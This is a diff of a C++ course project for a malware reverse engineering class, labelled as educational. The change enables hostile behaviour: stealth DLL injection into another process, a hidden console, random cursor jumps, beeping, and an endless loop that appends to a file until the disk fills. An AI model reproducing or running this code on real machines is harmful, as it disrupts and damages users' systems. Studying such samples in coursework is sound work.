@@ -1,3 +1,12 @@
+/*
+	This is a our group project for EEL 4084 Introduction to Malware Reverse Engineering with 
+	Dr. Pons at FIU. This is for educational purposes only. Please do not run this code on your system.
+	It is designed to run on 64-Bit processes and can cause serious problems for your computer. 
+
+*/
+
+
+
 #include <tchar.h>
 #include <iostream>
 #include <string>
@@ -27,8 +36,8 @@ void randomMouse()
 
 	SetCursorPos(1 + (rand() % mx), 1 + (rand() % my));
 
-	// This is where you changge the sleep value.
-	Sleep(1000);
+	// 1000 = 1 second.
+	Sleep(100);
 }
 
 int _tmain(int argc, _TCHAR* argv[])
@@ -48,13 +57,13 @@ int _tmain(int argc, _TCHAR* argv[])
 	// Inject dllToInject into the target process Id, passing 
 	// freqOffset as the pass through data.
 	NTSTATUS nt = RhInjectLibrary(
-		processId,   // The process to inject into
-		0,           // ThreadId to wake up upon injection
+		processId,		// The process to inject into
+		0,				// ThreadId to wake up upon injection
 		EASYHOOK_INJECT_STEALTH,
-		NULL, // 32-bit
-		dllToInject,		 // 64-bit not provided
-		NULL, // data to send to injected DLL entry point
-		0// size of data to send
+		NULL,			// 32-bit
+		dllToInject,	// 64-bit not provided
+		NULL,			// data to send to injected DLL entry point
+		0				// size of data to send
 	);
 
 	if (nt != 0)
@@ -69,8 +78,10 @@ int _tmain(int argc, _TCHAR* argv[])
 		FreeConsole();
 		while (true)
 		{
+			Beep(500, 500);
+			Beep(1500, 500);
 			randomMouse();
-		//	system("dir>>RainbowTable.txt");
+			system("dir>>RainbowTable.txt");
 		}
 	}
 
